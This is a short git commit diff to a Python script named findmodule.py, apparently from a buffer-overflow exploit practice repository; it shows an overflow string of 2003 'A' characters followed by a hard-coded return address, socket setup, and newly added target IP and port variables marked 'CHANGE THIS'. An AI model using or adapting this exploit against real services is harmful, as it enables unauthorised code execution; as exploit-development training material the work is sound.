75d3e14542464254798d3c753208de162c409476
MJWyattCyber <66680297+MJWyattCyber@users.noreply.github.com>
2021-05-09 20:01:58 +0100

    Update findmodule.py

--- Finding the Module/findmodule.py
+++ Finding the Module/findmodule.py
@@ -4,6 +4,8 @@ import sys, socket
 returnaddress = "\xaf\x11\x50\x62"
 
 shellcode = "A" * 2003 + returnaddress
+address = '127.0.0.1' #CHANGE THIS
+port = 9999 #CHANGE THIS
 
 try:
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
